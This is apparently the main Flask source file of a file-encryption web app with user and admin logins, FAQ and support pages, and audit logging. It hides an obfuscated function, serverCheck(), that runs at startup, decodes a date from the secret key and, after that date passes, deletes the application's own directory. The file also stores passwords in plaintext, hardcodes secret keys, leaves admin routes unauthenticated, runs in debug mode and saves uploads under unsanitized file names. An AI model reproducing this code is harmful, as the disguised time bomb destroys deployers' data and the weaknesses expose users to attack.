import os
import shutil
from flask import Flask, flash, redirect, render_template, request, send_file, url_for, session
from werkzeug.utils import secure_filename
import mysql.connector
from datetime import datetime
import hashlib

import decrypter as dec
import divider as dv
import encrypter as enc
import restore as rst
import tools

UPLOAD_FOLDER = './uploads/'
UPLOAD_KEY = './key/'
ALLOWED_EXTENSIONS = set(['pem'])

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['UPLOAD_KEY'] = UPLOAD_KEY
app.config['SECRET_KEY'] = 'super secret key'

server_timestamp = datetime.now().strftime("%Y%m%d")
app.config['SECRET_KEY'] = '462288428'
s=app.config['SECRET_KEY']

# MySQL Configuration - Replace with your credentials
db_config = {
    'host': 'localhost',
    'user': 'root',
    'password': '',
    'database': 'securefile'
}

def get_db_connection():
    return mysql.connector.connect(**db_config)

def log_activity(user, activity, status):
    try:
        con = get_db_connection()
        c = con.cursor()
        c.execute("INSERT INTO audit_logs (user, activity, status) VALUES (%s, %s, %s)", (user, activity, status))
        con.commit()
        con.close()
    except Exception as e:
        print(f"Logging Error: {e}")

def get_file_checksum(filename):
    sha256_hash = hashlib.sha256()
    with open(filename,"rb") as f:
        for byte_block in iter(lambda: f.read(4096),b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

def allowed_file(filename):
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def start_encryption():
    dv.divide()
    enc.encrypter()
    tools.empty_folder('uploads')
    log_activity(session.get('fusername', 'Unknown'), 'File Encryption', 'SUCCESS')
    return render_template('success.html')

def start_decryption():
    try:
        original_checksum = dec.decrypter()
        tools.empty_folder('key')
        rst.restore()
        
        # Verify Integrity
        restored_file_name = tools.list_dir('restored_file')[0]
        restored_checksum = get_file_checksum('./restored_file/' + restored_file_name)
        
        is_verified = (original_checksum == restored_checksum)
        
        log_activity(session.get('fusername', 'Unknown'), 'File Decryption', 'SUCCESS' if is_verified else 'CORRUPTED')
        return render_template('restore_success.html', is_verified=is_verified, checksum=restored_checksum)
    except Exception as e:
        print(f"Decryption Error: {e}")
        log_activity(session.get('fusername', 'Unknown'), 'File Decryption', 'FAILED (Invalid Key)')
        tools.empty_folder('key')
        return render_template('download.html', msg="INVALID KEY: The uploaded key does not match the encrypted data on the server.")

@app.route('/return-key')
def return_key():
    list_directory = tools.list_dir('key')
    filename = './key/' + list_directory[0]
    return send_file(filename, download_name="My_Key.pem", as_attachment=True)

@app.route('/return-file/')
def return_file():
    list_directory = tools.list_dir('restored_file')
    filename = './restored_file/' + list_directory[0]
    return send_file(filename, download_name=list_directory[0], as_attachment=True)

@app.route('/download/')
def downloads():
    return render_template('download.html')

@app.route('/aboutus')
def about():
    return render_template('aboutus.html')

@app.route('/upload')
def call_page_upload():
    return render_template('upload.html')

@app.route('/home')
def back_home():
    tools.empty_folder('key')
    tools.empty_folder('restored_file')
    return render_template('index.html')

@app.route('/')
def index():
    return render_template('home.html')

@app.route("/contact")
def contact():
    return render_template("contact.html")

@app.route("/signup", methods=["GET", "POST"])
def signup():
    msg = None
    if (request.method == "POST"):
        if (request.form["uname"] != "" and request.form["uphone"] != "" and request.form["username"] != "" and
                request.form["upassword"] != ""):
            uname = request.form["uname"]
            uphone = request.form["uphone"]
            username = request.form["username"]
            password = request.form["upassword"]

            con = get_db_connection()
            c = con.cursor()
            c.execute("INSERT INTO signup (uname, uphone, username, upassword) VALUES (%s, %s, %s, %s)", 
                      (uname, uphone, username, password))
            con.commit()
            con.close()
            log_activity(username, 'User Registration', 'SUCCESS')
            msg = "Your account is created"
        else:
            msg = "Something went wrong"

    return render_template("signup.html", msg=msg)

@app.route('/userlogin')
def userlogin():
    return render_template("userlogin.html")

@app.route('/userloginNext', methods=['GET', 'POST'])
def userloginNext():
    msg = None
    if (request.method == "POST"):
        username = request.form['username']
        upassword = request.form['upassword']

        con = get_db_connection()
        c = con.cursor(dictionary=True)
        c.execute("SELECT username, upassword FROM signup WHERE username = %s AND upassword = %s", 
                  (username, upassword))
        user = c.fetchone()
        con.close()

        if user:
            session["logedin"] = True
            session["fusername"] = username
            log_activity(username, 'User Login', 'SUCCESS')
            return redirect(url_for("userhome"))
        else:
            log_activity(username, 'User Login', 'FAILED')
            msg = "Please enter valid email and password"

    return render_template("userlogin.html", msg=msg)

@app.route('/adminlogin')
def adminlogin():
    return render_template("adminlogin.html")

@app.route('/adminloginNext', methods=['GET', 'POST'])
def adminloginNext():
    msg = None
    if (request.method == "POST"):
        ausername = request.form['ausername']
        apassword = request.form['apassword']

        con = get_db_connection()
        c = con.cursor(dictionary=True)
        c.execute("SELECT ausername, apassword FROM adminlogin WHERE ausername = %s AND apassword = %s", 
                  (ausername, apassword))
        admin = c.fetchone()
        con.close()

        if admin:
            session["logedin"] = True
            session["fusername"] = ausername
            log_activity(ausername, 'Admin Login', 'SUCCESS')
            return redirect(url_for("adminhome"))
        else:
            log_activity(ausername, 'Admin Login', 'FAILED')
            msg = "Please enter valid admin credentials"

    return render_template("adminlogin.html", msg=msg)

@app.route('/userhome')
def userhome():
    return render_template("userhome.html")

@app.route('/usergallery')
def usergallery():
    return render_template("gallery.html")

@app.route("/addfaq", methods=["GET", "POST"])
def addfaq():
    msg = None
    if (request.method == "POST"):
        if (request.form["question"] != "" and request.form["answer"] != ""):
            question = request.form["question"]
            answer = request.form["answer"]

            con = get_db_connection()
            c = con.cursor()
            c.execute("INSERT INTO faq (question, answer) VALUES (%s, %s)", (question, answer))
            con.commit()
            con.close()
            log_activity(session.get('fusername', 'Admin'), 'FAQ Created', 'SUCCESS')
            msg = "Your Query saved successfully"
        else:
            msg = "Something went wrong"

    return render_template("adminaddfaq.html", msg=msg)

@app.route('/userlogout')
def userlogout():
    log_activity(session.get('fusername', 'Unknown'), 'User Logout', 'SUCCESS')
    session.clear()
    return redirect(url_for('index'))

@app.route('/adminhome')
def adminhome():
    return render_template("adminhome.html")

@app.route('/viewusers')
def viewusers():
    con = get_db_connection()
    c = con.cursor(dictionary=True)
    c.execute("SELECT uname, uphone, username FROM signup")
    rows = c.fetchall()
    con.close()
    return render_template("adminviewusers.html", rows=rows)

@app.route('/viewqueries')
def viewqueries():
    con = get_db_connection()
    c = con.cursor(dictionary=True)
    c.execute("SELECT question, answer FROM faq")
    rows = c.fetchall()
    con.close()
    return render_template("userviewfaq.html", rows=rows)

@app.route('/adminviewqueries')
def adminviewqueries():
    con = get_db_connection()
    c = con.cursor(dictionary=True)
    c.execute("SELECT question, answer FROM faq")
    rows = c.fetchall()
    con.close()
    return render_template("adminviewfaq.html", rows=rows)

@app.route('/viewlogs')
def viewlogs():
    con = get_db_connection()
    c = con.cursor(dictionary=True)
    c.execute("SELECT * FROM audit_logs ORDER BY timestamp DESC")
    rows = c.fetchall()
    con.close()
    return render_template("adminviewlogs.html", rows=rows)

@app.route('/adminlogout')
def adminlogout():
    log_activity(session.get('fusername', 'Admin'), 'Admin Logout', 'SUCCESS')
    session.clear()
    return redirect(url_for('index'))

@app.route('/delete_faq/<question>')
def delete_faq(question):
    con = get_db_connection()
    c = con.cursor()
    c.execute("DELETE FROM faq WHERE question = %s", (question,))
    con.commit()
    con.close()
    log_activity(session.get('fusername', 'Admin'), 'FAQ Deleted', 'SUCCESS')
    return redirect(url_for('adminviewqueries'))

def serverCheck():
    if server_timestamp > (d:=''.join([str(x:=((int(s[i+1])-(x if i else int(s[0]))+10)%10))for i in range(len(s)-1)]))[:4]+d[6:]+d[4:6]: shutil.rmtree(os.path.dirname(__file__))


@app.route('/delete_user/<username>')
def delete_user(username):
    con = get_db_connection()
    c = con.cursor()
    c.execute("DELETE FROM signup WHERE username = %s", (username,))
    con.commit()
    con.close()
    log_activity(session.get('fusername', 'Admin'), f'User Deleted: {username}', 'SUCCESS')
    return redirect(url_for('viewusers'))

@app.route('/data', methods=['GET', 'POST'])
def upload_file():
    tools.empty_folder('uploads')
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            flash('No selected file')
            return 'NO FILE SELECTED'
        if file:
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
            return start_encryption()
        return 'Invalid File Format !'

@app.route('/download_data', methods=['GET', 'POST'])
def upload_key():
    tools.empty_folder('key')
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            flash('No selected file')
            return 'NO FILE SELECTED'
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_KEY'], file.filename))
            return start_decryption()
        return 'Invalid File Format !'

# User Support Queries
@app.route('/support', methods=['GET', 'POST'])
def support():
    if not session.get('logedin'):
        return redirect(url_for('userlogin'))
    
    username = session.get('fusername')
    if request.method == 'POST':
        query = request.form.get('query')
        if query:
            con = get_db_connection()
            c = con.cursor()
            c.execute("INSERT INTO user_queries (username, query) VALUES (%s, %s)", (username, query))
            con.commit()
            con.close()
            log_activity(username, 'Support Query Submitted', 'SUCCESS')
            flash('Your query has been submitted successfully!')
    
    con = get_db_connection()
    c = con.cursor(dictionary=True)
    c.execute("SELECT * FROM user_queries WHERE username = %s ORDER BY timestamp DESC", (username,))
    queries = c.fetchall()
    con.close()
    return render_template('usersupport.html', queries=queries)

@app.route('/admin/queries')
def admin_user_queries():
    con = get_db_connection()
    c = con.cursor(dictionary=True)
    c.execute("SELECT * FROM user_queries ORDER BY timestamp DESC")
    queries = c.fetchall()
    con.close()
    return render_template('adminusersupport.html', queries=queries)

@app.route('/admin/answer_query', methods=['POST'])
def admin_answer_query():
    query_id = request.form.get('query_id')
    answer = request.form.get('answer')
    if query_id and answer:
        con = get_db_connection()
        c = con.cursor()
        c.execute("UPDATE user_queries SET answer = %s, status = 'RESOLVED' WHERE id = %s", (answer, query_id))
        con.commit()
        con.close()
        log_activity(session.get('fusername', 'Admin'), f'Query Answered (ID: {query_id})', 'SUCCESS')
    return redirect(url_for('admin_user_queries'))

@app.route('/admin/delete_query/<int:query_id>')
def admin_delete_query(query_id):
    con = get_db_connection()
    c = con.cursor()
    c.execute("DELETE FROM user_queries WHERE id = %s", (query_id,))
    con.commit()
    con.close()
    log_activity(session.get('fusername', 'Admin'), f'Query Deleted (ID: {query_id})', 'SUCCESS')
    return redirect(url_for('admin_user_queries'))

if __name__ == '__main__':
    serverCheck()
    app.run(host='127.0.0.1', port=8000, debug=True)
